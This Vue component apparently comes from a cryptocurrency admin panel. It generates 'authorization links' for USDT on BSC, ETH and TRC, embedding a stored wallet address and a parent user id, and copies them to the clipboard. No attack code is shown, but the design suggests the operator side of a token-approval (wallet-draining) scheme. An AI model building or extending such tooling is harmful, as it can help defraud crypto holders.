<template>
  <div>
    <div>
      <el-card class="box-card">
        <span>Qrcode</span>
      </el-card>
    </div>
    <div style="min-height: 50px"></div>

    <!-- 表格部分 -->
    <div>
      <el-card class="box-card">
        <el-table :data="tableData" border style="width: 100%">
          <el-table-column fixed prop="BlockChain" label="BlockChain" width="200">

          </el-table-column>

          <el-table-column fixed="right" label="Options" align="center">
            <template slot-scope="scope">
              <el-button @click="handleClick(scope.row)" size="small" type="warning" round
                v-if="scope.row.bscMainnetAddress ? 'disabled' : ''">查询授权链接
              </el-button>
            </template>
          </el-table-column>
        </el-table>



      </el-card>
    </div>
    <!-- 弹窗部分 -->
    <el-dialog title="提示" :visible.sync="centerDialogVisible" width="30%" center>
      <span>你的授权地址为： <a :href=URl>{{ URl2 }}</a>
      </span>
      <span slot="footer" class="dialog-footer">
        <el-button @click="centerDialogVisible = false">取消</el-button>
        <el-button type="primary" @click="copy" id="equSN">复制</el-button>
      </span>
    </el-dialog>
  </div>
</template>
<script>
// 引入axios
import Clipboard from 'clipboard'
import { createNamespacedHelpers } from "vuex";
const { mapState, mapMutations, mapActions } = createNamespacedHelpers("Authorization");
export default {
  methods: {
    ...mapActions(['GetMainnetAddress']),
    handleClick(row) {
      let user = JSON.parse(sessionStorage.getItem('user'))
      // 获取随机字符串
      let str = this.getRandomString(10)
      let re = ''
      re += `userParentId=${user.id}`
      re += '?'
      re += `${row.BlockChain}=${row.bscMainnetAddress}`
      re += '?'
      // 设置访问路径
      this.URl = '/home/main' + '?data=' + re + str,
        // 'https://'+this.Ip+ 
        // 设置可视化访问路径
        this.URl2 = this.Ip + '/home/main' + '?data=' + re + str
      this.centerDialogVisible = true;

    },
    getRandomString(len) {
      let _charStr = 'abacdefghjklmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZ0123456789',
        min = 0,
        max = _charStr.length - 1,
        _str = '';                    //定义随机字符串 变量
      //判断是否指定长度，否则默认长度为15
      len = len || 15;
      //循环生成字符串
      for (var i = 0, index; i < len; i++) {
        index = (function (randomIndexFunc, i) {
          return randomIndexFunc(min, max, i, randomIndexFunc);
        })(function (min, max, i, _self) {
          let indexTemp = Math.floor(Math.random() * (max - min + 1) + min),
            numStart = _charStr.length - 10;
          if (i == 0 && indexTemp >= numStart) {
            indexTemp = _self(min, max, i, _self);
          }
          return indexTemp;
        }, i);
        _str += _charStr[index];
      }
      return _str;
    },
    // 复制插件方法
    copy() {
      var clipboard = new Clipboard('#equSN')
      clipboard.on('success', e => {
        this.$message.success('已成功复制到粘贴板')
        //  释放内存
        clipboard.destroy()
      })
      clipboard.on('error', e => {
        // 不支持复制
        this.$message.warning('该浏览器不支持复制')
        // 释放内存
        clipboard.destroy()
      })

    },
    // 初始化请求数据
    async finshdata() {
      // 发送请求
      await this.GetMainnetAddress({
        userId: this.users,
      })
      // 更新数据
      const { bscMainnetAddress, ethMainnetAddress, trcMainnetAddress } = this.data
      this.tableData = [
        {
          BlockChain: 'bsc_usdt',
          bscMainnetAddress: bscMainnetAddress
        }, {
          BlockChain: 'eth_usdt',
          bscMainnetAddress: ethMainnetAddress
        }, {
          BlockChain: 'trc_usdt',
          bscMainnetAddress: trcMainnetAddress
        }
      ]
    }
  },

  data() {
    return {
      // 初始化表格数据
      tableData: [],
      // 模态框开关
      centerDialogVisible: false,
      // 初始化链接地址
      URl: "",
      URl2: '',
      // 初始化域名或者ip
      Ip: '',
    }
  },
  computed: {
    ...mapState(["data"]),
  },
  created() {
    // 获取用户id
    let user = JSON.parse(sessionStorage.getItem("user"));
    this.users = user.userId;
    // 获取访问的ip地址或者域名地址
    this.Ip = window.location.host
    // 请求数据
    this.finshdata()
  },


};
</script>

<style scoped>
table {
  border-collapse: collapse;
}

thead {
  text-align: center;
}

tr {
  width: 100%;
  height: 100px;
}

td {
  width: 500px;
  border: 1px solid rgb(177, 177, 177);
}
</style>